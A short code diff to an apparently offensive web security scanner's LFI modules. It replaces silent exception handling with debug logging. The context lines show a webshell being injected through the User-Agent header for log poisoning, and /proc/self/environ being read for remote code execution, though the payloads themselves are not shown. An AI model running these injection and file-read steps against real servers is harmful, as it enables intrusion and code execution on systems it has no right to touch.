@@ -228,8 +228,8 @@ class LFIDirectoryTraversalProber(BaseScanner):
                         try:
                             import base64
                             decoded = base64.b64decode(body.strip()[:500]).decode("utf-8", errors="replace")
-                        except Exception:
-                            pass
+                        except Exception as _fix_e:
+                            logger.debug(f"[scanners.lfi] {type(_fix_e).__name__}: {_fix_e!r}")
                         hit = _lfi_sensitive_content(body) or _lfi_sensitive_content(decoded)
                         if hit:
                             finding = {
@@ -278,8 +278,8 @@ class LFILogPoisoningChain(BaseScanner):
         try:
             self.session.get(target, headers={"User-Agent": shell_payload}, timeout=8)
             logger.debug("[LogPoison] Webshell injected via User-Agent")
-        except Exception:
-            pass
+        except Exception as _fix_e:
+            logger.debug(f"[scanners.lfi] {type(_fix_e).__name__}: {_fix_e!r}")
 
         # 2. Try each log file via LFI
         for log_path in self._LOG_FILES:
@@ -335,8 +335,8 @@ class LFIProcEnvironRCE(BaseScanner):
         # Inject via User-Agent (maps to HTTP_USER_AGENT)
         try:
             self.session.get(target, headers={"User-Agent": shell}, timeout=8)
-        except Exception:
-            pass
+        except Exception as _fix_e:
+            logger.debug(f"[scanners.lfi] {type(_fix_e).__name__}: {_fix_e!r}")
 
         # LFI with /proc/self/environ
         for test_url in _inject_lfi(target, "/proc/self/environ")[:2]:
